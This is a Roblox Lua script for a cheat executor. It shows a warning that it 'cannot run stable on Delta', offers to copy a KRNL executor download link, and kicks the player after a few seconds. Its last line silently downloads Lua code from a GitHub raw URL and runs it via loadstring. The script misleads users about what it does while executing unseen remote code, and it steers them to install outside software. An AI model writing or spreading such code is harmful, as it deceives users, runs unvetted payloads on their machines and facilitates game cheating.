local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- GUI chính
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "ExecutorWarning"

-- Khung chính
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 420, 0, 210)
frame.Position = UDim2.new(0.5, -210, 0.5, -105)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.BackgroundTransparency = 0

-- Bo góc
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

-- Gradient nền
local gradient = Instance.new("UIGradient", frame)
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 60)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 30))
})
gradient.Rotation = 45

-- Đổ bóng
local shadow = Instance.new("ImageLabel", frame)
shadow.AnchorPoint = Vector2.new(0.5, 0.5)
shadow.Position = UDim2.new(0.5, 0, 0.5, 6)
shadow.Size = UDim2.new(1, 20, 1, 20)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://1316045217"
shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
shadow.ImageTransparency = 0.7
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(10, 10, 118, 118)
shadow.ZIndex = 0

-- Tiêu đề
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -20, 0, 60)
title.Position = UDim2.new(0, 10, 0, 20)
title.Text = "⚠️ This script cannot run stable on Delta. Please change your executor."
title.TextColor3 = Color3.fromRGB(255, 100, 100)
title.BackgroundTransparency = 1
title.TextSize = 19
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextWrapped = true

-- Gợi ý
local recommend = Instance.new("TextLabel", frame)
recommend.Size = UDim2.new(1, -20, 0, 25)
recommend.Position = UDim2.new(0, 10, 0, 95)
recommend.Text = "✅ Recommended: KRNL EXECUTOR"
recommend.TextColor3 = Color3.fromRGB(0, 255, 0)
recommend.BackgroundTransparency = 1
recommend.TextSize = 18
recommend.Font = Enum.Font.Gotham
recommend.TextXAlignment = Enum.TextXAlignment.Center

-- Nút copy
local copyBtn = Instance.new("TextButton", frame)
copyBtn.Size = UDim2.new(0, 280, 0, 40)
copyBtn.Position = UDim2.new(0.5, -140, 1, -60)
copyBtn.Text = "📋 Copy KRNL Download Link"
copyBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyBtn.Font = Enum.Font.GothamSemibold
copyBtn.TextSize = 16
copyBtn.AutoButtonColor = false

Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 8)

-- Animation xuất hiện
frame.Position = UDim2.new(0.5, -210, 1, 100)
frame.BackgroundTransparency = 1
TweenService:Create(frame, TweenInfo.new(0.6), {Position = UDim2.new(0.5, -210, 0.5, -105), BackgroundTransparency = 0}):Play()

-- Copy và animation
copyBtn.MouseButton1Click:Connect(function()
    setclipboard("https://krnl.cat/")
    copyBtn.Text = "✅ Link Copied!"
    TweenService:Create(copyBtn, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(0, 255, 0),
        Size = UDim2.new(0, 290, 0, 44)
    }):Play()
    wait(1.2)
    copyBtn.Text = "📋 Copy KRNL Download Link"
    TweenService:Create(copyBtn, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(60, 60, 70),
        Size = UDim2.new(0, 280, 0, 40)
    }):Play()
end)

-- Kick sau 5 giây (sau animation xuất hiện)
task.delay(0.6 + 5, function()
    player:Kick("⚠️ Change executor to use script!")
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkscriptHUBS/Gunggungka/refs/heads/main/Boboka9.lua"))()
